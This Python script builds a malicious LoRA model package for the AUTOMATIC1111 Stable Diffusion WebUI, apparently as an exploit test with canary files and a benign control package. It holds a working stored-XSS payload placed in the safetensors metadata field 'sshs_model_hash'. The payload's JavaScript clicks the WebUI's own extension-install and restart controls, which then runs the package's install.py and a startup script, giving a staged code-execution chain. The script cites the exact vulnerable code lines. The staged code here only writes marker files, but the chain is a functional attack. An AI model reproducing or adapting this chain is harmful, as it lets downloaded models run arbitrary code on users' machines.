#!/usr/bin/env python3
"""Build the attacker's LoRA package for root a1111.sshs_hash_xss_staged_rce.

Attacker capability = one downloadable LoRA package.  The victim unpacks it (or
`git clone`s it, which is how Hugging Face model repos are normally obtained)
into A1111's models/Lora directory.  Nothing is executed on the victim machine
by us and nothing is imported.

Package layout (positive):

    mbe2e_lora/
        evil.safetensors          -- valid safetensors; __metadata__.sshs_model_hash
                                     carries the payload
        install.py                -- stage 1, run by A1111's own extension installer
        scripts/mbe2e_stage2.py   -- stage 2, imported by scripts.load_scripts()
                                     on the next start of the WebUI
        .git/                     -- the package is a git checkout, exactly as it is
                                     after `git clone https://huggingface.co/<repo>`

The negative package is byte-identical except that sshs_model_hash holds an
ordinary 64-character hex string.
"""
import hashlib
import json
import os
import pathlib
import subprocess

import torch
from safetensors.torch import save_file

HERE = pathlib.Path(__file__).resolve().parent
ART = HERE / "artifact"

STAGE1 = "/out/pwned_by_a1111_sshs_stage1"
STAGE2 = "/out/pwned_by_a1111_sshs_stage2"
TOK1 = "MBE2E-CANARY-a1111-sshs-stage1-v1"
TOK2 = "MBE2E-CANARY-a1111-sshs-stage2-v1"

# --- the browser payload -----------------------------------------------------
# Rendered verbatim into  <span class='hidden search_terms'>...</span>
# by modules/ui_extra_networks.py:312-320 (search_term is the ONLY field on that
# card that is not passed through html.escape).  Runs on plain page load because
# modules/ui_extra_networks.py:788 wires create_html() to interface.load.
#
# It then drives A1111's own hidden "install extension from URL" controls
# (modules/ui_extensions.py:603-604, the same pair javascript/extensions.js:47-55
# uses) and finally presses "Apply and restart UI".
JS = (
    "(function(){"
    "if(window.__mb)return;window.__mb=1;"
    "var D=document,S=function(v){D.documentElement.setAttribute('data-mbe2e',v)};"
    "var g=function(){return window.gradioApp?gradioApp():D};"
    "S('XSS_RAN');"
    "var n=0,t=setInterval(function(){n++;"
    "var a=g().querySelector('#extension_to_install textarea');"
    "var b=g().querySelector('#install_extension_button');"
    "if(a&&b){clearInterval(t);"
    "a.value='models/Lora/mbe2e_lora';"
    "a.dispatchEvent(new Event('input',{bubbles:true}));"
    "setTimeout(function(){b.click();S('INSTALL_CLICKED');"
    "var m=0,u=setInterval(function(){m++;"
    "var r=g().querySelector('#extension_install_result');var x=r?r.textContent:'';"
    "var ok=x.indexOf('Installed into')>=0;"
    # A1111 runs the clone AND install.py before install_extension_from_index
    # refreshes the extension index, and that refresh can throw when no index has
    # been loaded -- the install still happened, the confirmation just never lands.
    # So proceed after a bounded wait instead of requiring the message.
    "if(ok||m>60){clearInterval(u);S(ok?'INSTALLED':'INSTALL_UNCONFIRMED');"
    "setTimeout(function(){"
    "var bs=[].slice.call(g().querySelectorAll('button'));"
    "var ap=bs.filter(function(q){return q.textContent.trim().indexOf('Apply and restart')===0})[0];"
    "if(ap){S('RESTART_CLICKED');ap.click();}"
    "else{var rl=g().querySelector('#settings_restart_gradio');"
    "if(rl){S('RELOAD_CLICKED');rl.click();}else{S('NO_RESTART_CONTROL');}}"
    "},2000);}"
    "},500);},400);}"
    "else if(n>240){clearInterval(t);S('NO_CONTROLS');}"
    "},500);})()"
)
PAYLOAD = '<img src=x onerror="' + JS + '">'
BENIGN_HASH = "b" * 64

INSTALL_PY = (
    "# stage 1: executed by modules/launch_utils.py:228-237 the moment A1111's\n"
    "# extension installer finishes cloning this package into extensions/.\n"
    "import pathlib\n"
    f"pathlib.Path({STAGE1!r}).write_text({TOK1!r} + chr(10))\n"
)

STAGE2_PY = (
    "# stage 2: imported by modules/scripts.py load_scripts() on the NEXT start of\n"
    "# the WebUI -- this is the restart/import boundary the root claims to cross.\n"
    "import pathlib\n"
    f"pathlib.Path({STAGE2!r}).write_text({TOK2!r} + chr(10))\n"
)

GIT_ENV = {
    "GIT_AUTHOR_NAME": "mbe2e",
    "GIT_AUTHOR_EMAIL": "mbe2e@example.invalid",
    "GIT_COMMITTER_NAME": "mbe2e",
    "GIT_COMMITTER_EMAIL": "mbe2e@example.invalid",
    "GIT_AUTHOR_DATE": "2026-01-01T00:00:00+0000",
    "GIT_COMMITTER_DATE": "2026-01-01T00:00:00+0000",
    "HOME": "/tmp",
    "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
}


def git(d, *args):
    subprocess.run(["git", "-C", str(d), *args], check=True, env=GIT_ENV,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def write_pack(root: pathlib.Path, dirname: str, model_hash: str, stem: str = "evil") -> None:
    d = root / dirname
    (d / "scripts").mkdir(parents=True, exist_ok=True)
    save_file(
        {"lora_down.weight": torch.zeros(4, dtype=torch.float32)},
        str(d / f"{stem}.safetensors"),
        metadata={
            "format": "pt",
            "ss_output_name": "mbe2e",
            "ss_network_module": "networks.lora",
            "sshs_model_hash": model_hash,
        },
    )
    (d / "install.py").write_text(INSTALL_PY, encoding="utf-8", newline="\n")
    (d / "scripts" / "mbe2e_stage2.py").write_text(STAGE2_PY, encoding="utf-8", newline="\n")
    (d / ".gitignore").write_text("*.safetensors\n", encoding="utf-8", newline="\n")
    git(d, "init", "-q", "-b", "main")
    git(d, "add", "install.py", "scripts/mbe2e_stage2.py", ".gitignore")
    git(d, "commit", "-q", "-m", "mbe2e package")


def main() -> None:
    pos = ART / "pos"
    neg = ART / "neg"
    for p in (pos, neg):
        p.mkdir(parents=True, exist_ok=True)
    write_pack(pos, "mbe2e_lora", PAYLOAD)
    write_pack(neg, "mbe2e_lora_benign", BENIGN_HASH, stem="benign")

    manifest = {}
    for p in sorted(ART.rglob("*")):
        if p.is_file() and ".git/" not in str(p.relative_to(ART)).replace(os.sep, "/"):
            manifest[str(p.relative_to(ART))] = {
                "sha256": hashlib.sha256(p.read_bytes()).hexdigest(),
                "size": p.stat().st_size,
            }
    blob = json.dumps(manifest, indent=2, sort_keys=True, ensure_ascii=False)
    (HERE / "artifact_manifest.json").write_text(blob + "\n", encoding="utf-8", newline="\n")
    print(blob)
    print("payload_bytes", len(PAYLOAD))


if __name__ == "__main__":
    main()
